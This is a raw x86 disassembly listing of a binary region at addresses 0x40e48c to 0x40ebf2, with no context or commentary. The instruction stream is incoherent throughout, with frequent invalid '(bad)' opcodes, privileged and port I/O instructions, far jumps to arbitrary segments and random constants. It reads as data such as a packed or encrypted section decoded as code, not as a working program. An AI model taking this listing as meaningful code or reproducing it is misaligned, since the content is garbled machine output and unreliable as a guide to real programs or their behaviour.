  40e48c:	mov    WORD PTR [eax],es
  40e48e:	jecxz  0x40e4ca
  40e490:	test   al,0xe1
  40e492:	pop    ecx
  40e493:	(bad)  
  40e494:	cs push 0xc3ba1e2c
  40e49a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e49c:	adc    bh,bl
  40e49e:	mov    DWORD PTR [ebx+0xf9ac767],edx
  40e4a4:	cs addr16 xchg edi,esi
  40e4a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4a9:	fstp   QWORD PTR [edi-0x517047a0]
  40e4af:	or     ebp,DWORD PTR [eax]
  40e4b1:	rcl    DWORD PTR [esi-0x5a686761],cl
  40e4b7:	outs   dx,BYTE PTR ds:[esi]
  40e4b8:	jp     0x40e441
  40e4ba:	xchg   edx,eax
  40e4bb:	xchg   edx,eax
  40e4bc:	pop    edi
  40e4bd:	push   ebx
  40e4be:	mov    ah,0xa3
  40e4c0:	push   0x990bd6f0
  40e4c5:	cmc    
  40e4c6:	push   ecx
  40e4c7:	dec    esi
  40e4c8:	mov    bl,0xf6
  40e4ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4cb:	inc    edi
  40e4cc:	jno    0x40e4ff
  40e4ce:	shr    BYTE PTR [edx+0x7e],cl
  40e4d1:	rcr    edi,0xdc
  40e4d4:	pusha  
  40e4d5:	jecxz  0x40e54c
  40e4d7:	push   edx
  40e4d8:	cmp    BYTE PTR [edi],dh
  40e4da:	rcr    DWORD PTR [esi],1
  40e4dc:	gs inc ebx
  40e4de:	xor    esp,DWORD PTR [esp+edi*1]
  40e4e1:	and    dh,BYTE PTR [ebp-0x3d]
  40e4e4:	or     bh,BYTE PTR [ebp+0x6edbd4ff]
  40e4ea:	push   ecx
  40e4eb:	add    edx,DWORD PTR ds:0xb043033b
  40e4f1:	xchg   ecx,eax
  40e4f2:	jns    0x40e569
  40e4f4:	jg     0x40e506
  40e4f6:	into   
  40e4f7:	mov    WORD PTR [edx],es
  40e4f9:	inc    ecx
  40e4fa:	jnp    0x40e551
  40e4fc:	fsub   DWORD PTR [edi]
  40e4fe:	add    al,0x75
  40e500:	data16 lods al,BYTE PTR ds:[esi]
  40e502:	xor    DWORD PTR [ecx],0x23
  40e505:	das    
  40e506:	sbb    bh,dh
  40e508:	(bad)  
  40e509:	mov    edi,0x95c44eaa
  40e50e:	sets   BYTE PTR es:[ecx+0x70]
  40e513:	sbb    BYTE PTR [edx],ch
  40e515:	xor    al,0x4c
  40e517:	cmc    
  40e518:	xchg   edi,eax
  40e519:	fdivr  DWORD PTR [ecx+0x51]
  40e51c:	mov    dh,0x9
  40e51e:	ins    DWORD PTR es:[edi],dx
  40e51f:	(bad)  
  40e520:	sbb    ah,BYTE PTR [ebx+0xd]
  40e523:	cli    
  40e524:	sub    ebx,DWORD PTR [edi+0xc5d59de]
  40e52a:	xchg   ecx,eax
  40e52b:	pop    ss
  40e52c:	ficomp WORD PTR [esi-0x35bc5a9]
  40e532:	idiv   DWORD PTR [eax-0x15]
  40e535:	data16 jbe 0x40e522
  40e538:	fsubr  st,st(6)
  40e53a:	or     ebx,DWORD PTR [ebx]
  40e53c:	cld    
  40e53d:	pop    esi
  40e53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e53f:	adc    DWORD PTR [edx-0xf],ebp
  40e542:	add    esp,edx
  40e544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e545:	lea    eax,[edi+0x201c9cb2]
  40e54b:	inc    esi
  40e54c:	sbb    al,0x68
  40e54e:	sub    eax,0xa0a41b18
  40e553:	and    eax,0x5c1f3bb5
  40e558:	add    esi,DWORD PTR [ecx-0x4caaa9ed]
  40e55e:	xlat   BYTE PTR ds:[ebx]
  40e55f:	jbe    0x40e52c
  40e561:	(bad)  
  40e562:	xchg   edx,eax
  40e563:	inc    esi
  40e564:	mov    ecx,edi
  40e566:	and    ecx,DWORD PTR [esi+ebp*8-0x3c896297]
  40e56d:	clc    
  40e56e:	add    DWORD PTR [esi-0x218de691],0xffffff92
  40e575:	ds push ebx
  40e577:	pop    eax
  40e578:	clc    
  40e579:	(bad)  
  40e57a:	mov    ecx,0x8f4d361c
  40e57f:	cmp    DWORD PTR ds:0xe10cf9d6,ecx
  40e585:	pop    eax
  40e586:	lds    esp,FWORD PTR [eax-0x3f]
  40e589:	in     al,0x86
  40e58b:	and    bh,bl
  40e58d:	sbb    BYTE PTR [ecx-0x4dafcc2c],dl
  40e593:	ins    DWORD PTR es:[edi],dx
  40e594:	stc    
  40e595:	pusha  
  40e596:	fsubr  st,st(3)
  40e598:	lock mov esp,0xb7f32002
  40e59e:	pop    ebp
  40e59f:	xchg   esi,eax
  40e5a0:	xor    al,0xa9
  40e5a2:	fidivr DWORD PTR [edi]
  40e5a4:	ud0    ebx,DWORD PTR [ebx+0x78b85ba7]
  40e5ab:	mov    BYTE PTR [ecx-0x70069399],ch
  40e5b1:	mov    al,ds:0x51c88d3e
  40e5b6:	sub    eax,0x79234033
  40e5bb:	cs mov ebx,gs
  40e5be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5bf:	call   DWORD PTR [edx+eiz*2]
  40e5c2:	imul   ebx
  40e5c4:	or     esp,DWORD PTR [ecx-0x4f]
  40e5c7:	add    esp,DWORD PTR [eax+0x1bed1188]
  40e5cd:	cmp    edx,esp
  40e5cf:	mov    WORD PTR [esi-0x21],ss
  40e5d2:	jb     0x40e5de
  40e5d4:	sub    eax,0xe166ca35
  40e5d9:	xchg   DWORD PTR [esp+ebp*2],eax
  40e5dc:	repz jg 0x40e5cd
  40e5df:	jle    0x40e607
  40e5e1:	loope  0x40e5fc
  40e5e3:	sbb    eax,0x8b1ab1cc
  40e5e8:	pop    edi
  40e5e9:	push   edi
  40e5ea:	jge    0x40e582
  40e5ec:	cmc    
  40e5ed:	fs inc ecx
  40e5ef:	cmp    cl,dl
  40e5f1:	sub    eax,0xa0866299
  40e5f6:	sub    ecx,DWORD PTR [ecx-0x4911aba5]
  40e5fc:	sbb    BYTE PTR [ebx+0x9],bh
  40e5ff:	(bad)  [edi+0x43e00d30]
  40e605:	jp     0x40e629
  40e607:	or     BYTE PTR [edx-0x48],al
  40e60a:	in     al,0xbc
  40e60c:	dec    esp
  40e60d:	sti    
  40e60e:	dec    eax
  40e60f:	jp     0x636130e4
  40e615:	mov    ds:0x3aab570d,al
  40e61a:	sub    bh,BYTE PTR [ebp+ebx*8-0x32]
  40e61e:	xor    DWORD PTR [edi],ebx
  40e620:	and    bl,BYTE PTR [eax]
  40e622:	jno    0x40e5ad
  40e624:	pusha  
  40e625:	sub    BYTE PTR [esi],ah
  40e627:	cld    
  40e628:	xchg   edx,eax
  40e629:	lea    ebp,[esi+0x74910abc]
  40e62f:	popf   
  40e630:	ins    BYTE PTR es:[edi],dx
  40e631:	fisttp QWORD PTR [ebx-0x645c781b]
  40e637:	xor    ch,ah
  40e639:	scas   al,BYTE PTR es:[edi]
  40e63a:	daa    
  40e63b:	push   edi
  40e63c:	es jmp 0x4d60:0xcdc41a12
  40e644:	jg     0x40e684
  40e646:	and    BYTE PTR [ecx+edx*4],bh
  40e649:	mov    ds:0xa7e596c7,al
  40e64e:	and    al,0x46
  40e650:	or     ebp,ebp
  40e652:	jno    0x40e5e5
  40e654:	push   ecx
  40e655:	mov    bh,0xe
  40e657:	sub    DWORD PTR [eax],0xca448ac1
  40e65d:	sub    ah,ah
  40e65f:	aas    
  40e660:	pop    edx
  40e661:	push   0x194f5133
  40e666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e667:	sbb    eax,0x29e6eb8
  40e66c:	inc    esp
  40e66d:	xor    DWORD PTR [ebx+ebx*4],0x28eb8337
  40e674:	scas   eax,DWORD PTR es:[edi]
  40e675:	daa    
  40e676:	pop    ds
  40e677:	jmp    0x40e695
  40e679:	sub    eax,0xe4935b95
  40e67e:	or     BYTE PTR [esi],ch
  40e680:	jb     0x40e672
  40e682:	mov    ecx,0x39867ee8
  40e687:	adc    ah,BYTE PTR [edi+0x2cce51d9]
  40e68d:	in     al,dx
  40e68e:	jne    0x40e615
  40e690:	scas   eax,DWORD PTR es:[edi]
  40e691:	push   eax
  40e692:	adc    ebx,DWORD PTR [esi+edx*4-0x15d6dc43]
  40e699:	pop    eax
  40e69a:	lods   eax,DWORD PTR ds:[esi]
  40e69b:	fadd   DWORD PTR [ebx-0x1e938499]
  40e6a1:	(bad)  
  40e6a2:	dec    edx
  40e6a3:	inc    sp
  40e6a5:	dec    eax
  40e6a6:	sahf   
  40e6a7:	nop
  40e6a8:	jmp    0x40e65a
  40e6aa:	into   
  40e6ab:	enter  0x76fe,0xb
  40e6af:	call   0xcfbab50e
  40e6b4:	mov    esi,0x82c4514
  40e6b9:	sub    DWORD PTR [eax-0x17],eax
  40e6bc:	push   ss
  40e6bd:	xor    esi,DWORD PTR [eax+0x18596ebc]
  40e6c3:	pop    ebx
  40e6c4:	lods   al,BYTE PTR ds:[esi]
  40e6c5:	lahf   
  40e6c6:	mov    eax,ds:0x165799e1
  40e6cb:	leave  
  40e6cc:	(bad)  
  40e6ce:	mov    eax,ds:0xbd3a72d7
  40e6d3:	dec    ebx
  40e6d4:	push   eax
  40e6d5:	mov    ecx,0x8ee98250
  40e6da:	stos   BYTE PTR es:[edi],al
  40e6db:	lods   al,BYTE PTR ds:[esi]
  40e6dc:	ret    
  40e6dd:	mov    ecx,0x177a5580
  40e6e2:	mov    bh,0xf5
  40e6e4:	clc    
  40e6e5:	inc    esp
  40e6e6:	test   BYTE PTR [esi+0x18],bl
  40e6e9:	push   ss
  40e6ea:	adc    BYTE PTR gs:[edi-0x1],0x2a
  40e6ef:	jmp    0x9b92:0xf813d80c
  40e6f6:	enter  0x7344,0x61
  40e6fa:	mov    esi,0xdf89b468
  40e6ff:	scas   eax,DWORD PTR es:[edi]
  40e700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e701:	inc    eax
  40e702:	icebp  
  40e703:	mov    BYTE PTR [eax-0x48be85ce],ah
  40e709:	inc    ebp
  40e70a:	sbb    DWORD PTR [esp+eiz*8+0x347c973f],eax
  40e711:	shl    bh,0x45
  40e714:	pop    ds
  40e715:	pop    edx
  40e716:	cs addr16 and al,0xe3
  40e71a:	cmp    ch,BYTE PTR ds:0x3be8cde7
  40e720:	outs   dx,DWORD PTR ds:[esi]
  40e721:	xor    eax,0xb07b6fed
  40e726:	es add eax,0xf0e433f6
  40e72c:	add    esp,DWORD PTR [edi+0x1253e3b1]
  40e732:	scas   al,BYTE PTR es:[edi]
  40e733:	cmp    edi,DWORD PTR [ebp+0x1b]
  40e736:	mov    al,BYTE PTR [ebx-0x20]
  40e739:	mov    DWORD PTR [ebp+0x6b],esp
  40e73c:	shl    bh,cl
  40e73e:	adc    al,0xa9
  40e740:	in     al,dx
  40e741:	rol    esp,1
  40e743:	fnsave [edx]
  40e745:	and    al,al
  40e747:	fsub   st,st(2)
  40e749:	popf   
  40e74a:	mov    bh,0x39
  40e74c:	das    
  40e74d:	mov    dl,0xa4
  40e74f:	dec    esp
  40e750:	aas    
  40e751:	gs and al,0x6d
  40e754:	fcomi  st,st(0)
  40e756:	or     eax,0xc08d1b97
  40e75b:	pop    es
  40e75c:	bound  eax,QWORD PTR [ecx-0x65b99bd8]
  40e762:	add    al,0xfa
  40e764:	dec    eax
  40e765:	mov    dh,0x0
  40e767:	dec    edi
  40e768:	add    DWORD PTR ss:[ecx],0x1a
  40e76c:	push   ebp
  40e76d:	adc    al,0xce
  40e76f:	xlat   BYTE PTR ds:[ebx]
  40e770:	add    esp,DWORD PTR [edi-0x73]
  40e773:	stos   BYTE PTR es:[edi],al
  40e774:	sar    dh,cl
  40e776:	test   DWORD PTR [ebp-0x5e95967b],0xce049342
  40e780:	adc    eax,0x4d2fcb24
  40e785:	or     BYTE PTR [edi],bl
  40e787:	(bad)  
  40e789:	cdq    
  40e78a:	push   ebp
  40e78b:	xchg   edx,eax
  40e78c:	sub    ecx,ecx
  40e78e:	into   
  40e78f:	mov    ebx,0xd717acc4
  40e794:	mov    ss,WORD PTR [esi+0x4e]
  40e797:	aaa    
  40e798:	and    edx,DWORD PTR [esi-0x2d]
  40e79b:	xchg   esi,eax
  40e79c:	cmp    eax,0xf64ac9f0
  40e7a1:	sub    dh,BYTE PTR [ecx-0x5ff2b95]
  40e7a7:	xchg   edx,eax
  40e7a8:	rcr    ch,1
  40e7aa:	pop    edi
  40e7ab:	xchg   ebx,eax
  40e7ac:	test   BYTE PTR [ebx+esi*2+0x3],al
  40e7b0:	test   DWORD PTR [ebp-0x22],0x8e8d85c6
  40e7b7:	mov    dl,0x48
  40e7b9:	dec    ecx
  40e7ba:	iret   
  40e7bb:	pusha  
  40e7bc:	add    BYTE PTR [edx+0x4eb8df6a],al
  40e7c2:	add    cl,ah
  40e7c4:	mov    dl,0x38
  40e7c6:	cwde   
  40e7c7:	inc    eax
  40e7c8:	mov    ds:0xd42cb88d,eax
  40e7cd:	int    0x7d
  40e7cf:	jg     0x40e84d
  40e7d1:	and    BYTE PTR [esi],dh
  40e7d3:	push   ss
  40e7d4:	pusha  
  40e7d5:	cld    
  40e7d6:	xacquire xchg DWORD PTR [esi],ebx
  40e7d9:	sbb    DWORD PTR [edx-0x72],0xffffffda
  40e7dd:	les    edx,FWORD PTR [esi]
  40e7df:	jge    0x40e78d
  40e7e1:	push   esp
  40e7e2:	push   eax
  40e7e3:	add    eax,0xbd1352e2
  40e7e8:	rol    BYTE PTR [ecx+ecx*1],cl
  40e7eb:	jecxz  0x40e784
  40e7ed:	add    ecx,DWORD PTR [eax]
  40e7ef:	rcl    DWORD PTR [esi+0x449ca26a],0xc2
  40e7f6:	repnz test al,bh
  40e7f9:	bound  ecx,QWORD PTR [edi+0x5f64ed0c]
  40e7ff:	xchg   BYTE PTR [eax+edi*1],ch
  40e802:	into   
  40e803:	hlt    
  40e804:	fdiv   DWORD PTR [eax]
  40e806:	mov    dl,0xcf
  40e808:	in     al,0xfc
  40e80a:	fwait
  40e80b:	xchg   esp,eax
  40e80c:	jbe    0x40e7cf
  40e80e:	mov    bh,0xe7
  40e810:	pop    esp
  40e811:	or     dl,BYTE PTR [ebx+0x483c19c9]
  40e817:	clc    
  40e818:	jl     0x40e7b2
  40e81a:	dec    eax
  40e81b:	arpl   WORD PTR [ecx+0x55],di
  40e81e:	dec    esp
  40e81f:	adc    edx,DWORD PTR [eax]
  40e821:	cmp    eax,0xb4c607e0
  40e826:	ss out dx,al
  40e828:	fwait
  40e829:	push   ebp
  40e82a:	dec    ecx
  40e82b:	inc    ebx
  40e82c:	or     ah,BYTE PTR [ebx-0x37]
  40e82f:	sub    BYTE PTR [eax+eiz*8],cl
  40e832:	int    0x43
  40e834:	je     0x40e7e0
  40e836:	and    al,0xe5
  40e838:	stc    
  40e839:	out    0xe1,eax
  40e83b:	fst    QWORD PTR [edx]
  40e83d:	jg     0x40e7d9
  40e83f:	adc    dl,BYTE PTR [ebp+ebx*8+0xf8a96a5]
  40e846:	sahf   
  40e847:	mov    ebp,0x5c335f5c
  40e84c:	cli    
  40e84d:	sti    
  40e84e:	test   al,0x89
  40e850:	pop    ecx
  40e851:	pop    esp
  40e852:	jae    0x40e8b3
  40e854:	lock test ebp,ebp
  40e857:	cdq    
  40e858:	pop    ss
  40e859:	call   0x9455:0x18e65086
  40e860:	xor    eax,0xea739165
  40e865:	xchg   BYTE PTR [ecx+0x48],bl
  40e868:	xor    DWORD PTR [ebx],0x3d40d7dc
  40e86e:	fimul  DWORD PTR [ecx+0x631e2c74]
  40e874:	dec    eax
  40e875:	xor    ch,ch
  40e877:	(bad)  
  40e878:	jge    0x40e865
  40e87a:	imul   ecx,DWORD PTR [edi-0x43],0xd42b2933
  40e881:	add    al,0x8a
  40e883:	sbb    BYTE PTR [eax],dh
  40e885:	mov    bl,0x2
  40e887:	sub    bl,ah
  40e889:	loopne 0x40e86d
  40e88b:	pop    ss
  40e88c:	fbstp  TBYTE PTR [edx+eiz*1-0x24]
  40e890:	icebp  
  40e891:	mov    WORD PTR [eax],cs
  40e893:	jge    0x40e817
  40e895:	popa   
  40e896:	hlt    
  40e897:	add    dh,0xa2
  40e89a:	loopne 0x40e8f7
  40e89c:	cmp    BYTE PTR [eax],ah
  40e89e:	pop    eax
  40e89f:	adc    dl,BYTE PTR [edi]
  40e8a1:	test   BYTE PTR [ebx-0x1f7ca033],al
  40e8a7:	xor    bl,BYTE PTR [edi+eiz*8+0x4f]
  40e8ab:	xchg   esi,eax
  40e8ac:	mov    bl,0xfb
  40e8ae:	xchg   ebx,eax
  40e8af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8b0:	or     DWORD PTR [esp+ecx*2-0x62],edi
  40e8b4:	repz lock jnp 0x40e911
  40e8b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8b9:	test   BYTE PTR [esi-0xcfa168a],0xcb
  40e8c0:	mov    eax,0x2e19ddca
  40e8c5:	les    esp,FWORD PTR [eax+0x7daa883d]
  40e8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8cc:	into   
  40e8cd:	leave  
  40e8ce:	sub    eax,0x588a00a3
  40e8d3:	and    al,0xf8
  40e8d5:	jnp    0x40e92a
  40e8d7:	fidivr WORD PTR [edx+0x414906ea]
  40e8dd:	push   ds
  40e8de:	out    0xd4,eax
  40e8e0:	jmp    0x4eb3:0x63d5dac9
  40e8e7:	aas    
  40e8e8:	sbb    BYTE PTR [eax],bl
  40e8ea:	inc    ebx
  40e8eb:	pop    es
  40e8ec:	sbb    ch,bh
  40e8ee:	sahf   
  40e8ef:	js     0x40e94a
  40e8f1:	mov    al,0xf2
  40e8f3:	icebp  
  40e8f4:	in     eax,dx
  40e8f5:	xchg   eax,esp
  40e8f7:	fst    QWORD PTR [ecx]
  40e8f9:	fucom  st(3)
  40e8fb:	push   ebx
  40e8fc:	add    BYTE PTR [edx-0x6bff28d2],ah
  40e902:	or     eax,0xe68b6953
  40e907:	pop    ss
  40e908:	test   BYTE PTR [edx+0x9],bl
  40e90b:	cld    
  40e90c:	cmp    eax,0x79057099
  40e911:	daa    
  40e912:	xchg   BYTE PTR [eax],cl
  40e914:	xchg   edx,eax
  40e915:	mov    ebx,0xfda339d4
  40e91a:	hlt    
  40e91b:	mov    WORD PTR [edi],ss
  40e91d:	pushf  
  40e91e:	sbb    BYTE PTR [edx+eiz*8-0x3e],bh
  40e922:	sbb    DWORD PTR [ebp-0xc],eax
  40e925:	add    dl,0xff
  40e928:	adc    eax,0x5b1c912d
  40e92d:	or     eax,0x6ece0b21
  40e932:	cmp    BYTE PTR [edi+0x187ba980],ah
  40e938:	xlat   BYTE PTR ds:[ebx]
  40e939:	fldcw  WORD PTR [ecx-0x5045df26]
  40e93f:	cli    
  40e940:	pop    edx
  40e941:	jmp    0x40e954
  40e943:	adc    dh,BYTE PTR [eax]
  40e945:	test   al,0x9c
  40e947:	adc    edx,DWORD PTR [ecx-0x7f]
  40e94a:	xor    ch,ch
  40e94c:	test   DWORD PTR [ebx+0x7a12a1fb],ebx
  40e952:	ja     0x40e9af
  40e954:	mov    edi,0xbf329d32
  40e959:	mov    eax,ss
  40e95b:	xor    al,bh
  40e95d:	xor    DWORD PTR [ebp-0x7d],0xffffffbc
  40e961:	inc    edi
  40e962:	sub    ah,bh
  40e964:	push   0x833ffd5c
  40e969:	bound  ecx,QWORD PTR ds:0x92077688
  40e96f:	inc    esp
  40e970:	stc    
  40e971:	add    al,0xa7
  40e973:	in     al,dx
  40e974:	in     eax,dx
  40e975:	mov    dl,0x89
  40e977:	aas    
  40e978:	xor    al,0x8a
  40e97a:	call   DWORD PTR ds:0x82411d6e
  40e980:	mov    cl,0xd1
  40e982:	xor    eax,DWORD PTR [edx-0x29071876]
  40e988:	(bad)  
  40e989:	xor    DWORD PTR [esi],ecx
  40e98b:	bound  esi,QWORD PTR [ebx+0x62]
  40e98e:	bound  esp,QWORD PTR [edi-0x5a]
  40e991:	ss (bad) 
  40e994:	jnp    0x40e97e
  40e996:	push   esp
  40e997:	call   FWORD PTR [eax-0x69]
  40e99a:	adc    eax,0x3c4165f1
  40e99f:	cmp    eax,0x522946b4
  40e9a4:	inc    edi
  40e9a5:	lods   eax,DWORD PTR ds:[esi]
  40e9a6:	jb     0x40e987
  40e9a8:	xlat   BYTE PTR ds:[ebx]
  40e9a9:	sub    al,0xb5
  40e9ab:	mov    ah,0x6c
  40e9ad:	jns    0x40e944
  40e9af:	xor    BYTE PTR [ebx+0x699e0a10],0xb0
  40e9b6:	sbb    cl,BYTE PTR [ebp-0x52]
  40e9b9:	lahf   
  40e9ba:	xchg   edi,eax
  40e9bb:	add    bh,BYTE PTR [ebx+0x7a6c7456]
  40e9c1:	stos   BYTE PTR es:[edi],al
  40e9c2:	call   0xf72b:0x32e4c34c
  40e9c9:	(bad)  
  40e9ca:	fabs   
  40e9cc:	scas   al,BYTE PTR es:[edi]
  40e9cd:	cmp    cl,bl
  40e9cf:	sub    DWORD PTR [edx+ecx*4],esp
  40e9d2:	inc    ecx
  40e9d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9d4:	aas    
  40e9d5:	sub    ebp,ebp
  40e9d7:	sbb    edx,DWORD PTR [eax-0x3c]
  40e9da:	xor    ebx,ebp
  40e9dc:	shl    bh,cl
  40e9de:	imul   ecx,DWORD PTR [ebx],0xffffffe0
  40e9e1:	sub    eax,0xf52f5f7f
  40e9e6:	fiadd  DWORD PTR [ebx-0x40]
  40e9e9:	outs   dx,BYTE PTR ds:[esi]
  40e9ea:	and    BYTE PTR [esi+0x24],0x1a
  40e9ee:	inc    esp
  40e9ef:	inc    ebx
  40e9f0:	inc    esp
  40e9f1:	imul   edx,DWORD PTR es:[bp-0x12],0xffffff87
  40e9f7:	imul   ecx,DWORD PTR [edx-0x5f],0x3e344803
  40e9fe:	inc    edi
  40e9ff:	sub    eax,0x213a41c4
  40ea04:	sub    eax,0x9c682160
  40ea09:	mov    ah,0x67
  40ea0b:	ja     0x40ea55
  40ea0d:	push   ebp
  40ea0e:	ret    
  40ea0f:	cli    
  40ea10:	or     bh,BYTE PTR [ecx-0x7d]
  40ea13:	push   0x5111db0b
  40ea18:	sbb    cl,BYTE PTR [edi-0x54]
  40ea1b:	pop    esi
  40ea1c:	pop    eax
  40ea1d:	mov    bh,0x44
  40ea1f:	sbb    al,0xa6
  40ea21:	cmc    
  40ea22:	retf   
  40ea23:	mov    edx,0xda550f21
  40ea28:	sbb    BYTE PTR [ecx+ebx*1-0x5b],bl
  40ea2c:	enter  0x6737,0xf7
  40ea30:	cdq    
  40ea31:	and    ch,cl
  40ea33:	adc    BYTE PTR [edx-0x40b4c078],ch
  40ea39:	jnp    0x40ea06
  40ea3b:	clc    
  40ea3c:	sbb    al,0x9a
  40ea3e:	push   0x48
  40ea40:	aad    0xb4
  40ea42:	lods   eax,DWORD PTR ds:[esi]
  40ea43:	push   esp
  40ea44:	aam    0xe2
  40ea46:	scas   al,BYTE PTR es:[edi]
  40ea47:	imul   BYTE PTR ds:0xbaaa2c52
  40ea4d:	call   0x3aad:0x3c8ea367
  40ea54:	push   esp
  40ea55:	cdq    
  40ea56:	loop   0x40e9f8
  40ea58:	mov    ecx,0xce5da440
  40ea5d:	push   0xffffff88
  40ea5f:	pop    edi
  40ea60:	cs xchg esp,eax
  40ea62:	in     eax,dx
  40ea63:	les    eax,FWORD PTR [edx]
  40ea65:	shr    DWORD PTR [ebp+0x22],0x18
  40ea69:	int3   
  40ea6a:	lock aaa 
  40ea6c:	aad    0x89
  40ea6e:	or     ch,BYTE PTR [esi]
  40ea70:	xchg   BYTE PTR [edi],bl
  40ea72:	mov    ebp,0xc1f9349d
  40ea77:	xor    eax,0x83b42c07
  40ea7c:	pop    es
  40ea7d:	invd   
  40ea7f:	mov    esi,DWORD PTR [ebx]
  40ea81:	jg     0x40ea2e
  40ea83:	seto   BYTE PTR [esi+0x54]
  40ea87:	mov    edx,0xb1fcb922
  40ea8c:	out    0xed,al
  40ea8e:	add    eax,0x7676ea6a
  40ea93:	cli    
  40ea94:	enter  0xa3d8,0x30
  40ea98:	enter  0x150e,0xc6
  40ea9c:	lods   eax,DWORD PTR ds:[esi]
  40ea9d:	lock adc edi,DWORD PTR [edi-0x4ff2acb6]
  40eaa4:	add    edx,DWORD PTR [ebx-0x356833ef]
  40eaaa:	jp     0x40ea75
  40eaac:	ins    DWORD PTR es:[edi],dx
  40eaad:	mov    cs,WORD PTR [edx+0x7919533a]
  40eab3:	or     eax,0xb56fbd1a
  40eab8:	lock fiadd WORD PTR [edx-0x45cb73a0]
  40eabf:	in     eax,0xcf
  40eac1:	test   eax,0x90cab4f5
  40eac6:	fisttp DWORD PTR [eax]
  40eac8:	loop   0x40eb08
  40eaca:	pop    edx
  40eacb:	int    0xd6
  40eacd:	jge    0x40eaad
  40eacf:	in     eax,dx
  40ead0:	cmp    eax,0x9c9c1e41
  40ead5:	xor    eax,0xd63e183e
  40eada:	inc    ecx
  40eadb:	xlat   BYTE PTR ds:[ebx]
  40eadc:	stc    
  40eadd:	or     esp,0xffffffe8
  40eae0:	or     DWORD PTR [ecx],0x5959588f
  40eae6:	les    esi,FWORD PTR [ebx-0x54]
  40eae9:	add    dh,ah
  40eaeb:	(bad)  
  40eaec:	shr    BYTE PTR [edx+eiz*4],cl
  40eaef:	cmp    ch,dl
  40eaf1:	mov    ss,WORD PTR [ebp+0x76]
  40eaf4:	inc    edi
  40eaf5:	xchg   edx,eax
  40eaf6:	cdq    
  40eaf7:	rcr    DWORD PTR [esi-0x33],0x80
  40eafb:	and    DWORD PTR [edx-0xb],esi
  40eafe:	ss xchg edx,eax
  40eb00:	jo     0x40eb79
  40eb02:	in     eax,0x88
  40eb04:	loopne 0x40eaf2
  40eb06:	call   0xad716733
  40eb0b:	or     al,0xef
  40eb0d:	aad    0xa6
  40eb0f:	dec    ecx
  40eb10:	xor    BYTE PTR [esi],bh
  40eb12:	sbb    al,0x80
  40eb14:	mov    ds:0x37f68663,al
  40eb19:	stc    
  40eb1a:	rol    DWORD PTR [ecx-0x70],1
  40eb1d:	aam    0x22
  40eb1f:	push   eax
  40eb20:	lock in al,0x97
  40eb23:	or     bh,cl
  40eb25:	aaa    
  40eb26:	fs addr16 inc ebx
  40eb29:	lock cmp DWORD PTR cs:[esi+0x1c9dff4b],eax
  40eb31:	daa    
  40eb32:	or     ecx,edi
  40eb34:	in     eax,0x8f
  40eb36:	sub    BYTE PTR [edx],ah
  40eb38:	test   eax,0x192d6870
  40eb3d:	jmp    0xe11d64ce
  40eb42:	cmp    eax,0x3993ed41
  40eb47:	(bad)  
  40eb48:	sti    
  40eb49:	xor    bh,bl
  40eb4b:	mov    cl,0xd3
  40eb4d:	jbe    0x40eb57
  40eb4f:	fdivr  QWORD PTR [esi+0x72]
  40eb52:	mov    bl,0x1e
  40eb54:	push   cs
  40eb55:	mov    WORD PTR [edi-0x6aa47e2a],es
  40eb5b:	cmc    
  40eb5c:	imul   edi,DWORD PTR [edx-0x58],0xffffffb9
  40eb60:	repz mov dh,0xa3
  40eb63:	xchg   ebp,eax
  40eb64:	bound  eax,QWORD PTR [eax+ebp*1+0x6d]
  40eb68:	jo     0x40ebd1
  40eb6a:	pop    esi
  40eb6b:	xor    cl,cl
  40eb6d:	push   ds
  40eb6e:	mov    bh,0x9a
  40eb70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb71:	xchg   esi,eax
  40eb72:	sub    eax,0x150260be
  40eb77:	lods   eax,DWORD PTR ds:[esi]
  40eb78:	cmc    
  40eb79:	dec    edi
  40eb7a:	sub    BYTE PTR [edx-0x270a1d81],0x3
  40eb81:	out    0x48,al
  40eb83:	pop    ebx
  40eb84:	mov    edi,0xeda5defe
  40eb89:	and    DWORD PTR ds:0xf96af85d,ecx
  40eb8f:	icebp  
  40eb90:	shl    dh,0x6
  40eb93:	aam    0xb8
  40eb95:	iret   
  40eb96:	in     al,dx
  40eb97:	cwde   
  40eb98:	adc    DWORD PTR [esi],0x7f
  40eb9b:	es inc ecx
  40eb9d:	jecxz  0x40eb67
  40eb9f:	in     al,dx
  40eba0:	aam    0x92
  40eba2:	and    esp,DWORD PTR [ebx+0x207652a9]
  40eba8:	sbb    al,0x95
  40ebaa:	xor    eax,0xa27be89
  40ebaf:	lods   eax,DWORD PTR ds:[esi]
  40ebb0:	inc    edx
  40ebb1:	mov    ebp,0x23983c39
  40ebb6:	pusha  
  40ebb7:	fst    DWORD PTR [eax+0x36abf743]
  40ebbd:	or     eax,0x831ac939
  40ebc2:	mov    ds:0x49d3fa1a,eax
  40ebc7:	jmp    0x40ebe0
  40ebc9:	lahf   
  40ebca:	or     edx,DWORD PTR [ebx+0x6]
  40ebcd:	jmp    0x40ebd6
  40ebcf:	(bad)  
  40ebd0:	fnstcw WORD PTR [esi+0x49]
  40ebd3:	lds    esi,FWORD PTR [ecx+0x5]
  40ebd6:	js     0x40ec50
  40ebd8:	xlat   BYTE PTR ds:[ebx]
  40ebd9:	mov    BYTE PTR [ebx],ch
  40ebdb:	aas    
  40ebdc:	mov    ecx,DWORD PTR [edi-0x57]
  40ebdf:	imul   ebp,DWORD PTR [ecx-0x493f40b2],0x3f49ea31
  40ebe9:	mov    ebx,0xb9b27457
  40ebee:	pop    ebp
  40ebef:	scas   eax,DWORD PTR es:[edi]
  40ebf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebf1:	pop    esp
  40ebf2:	pop    eax
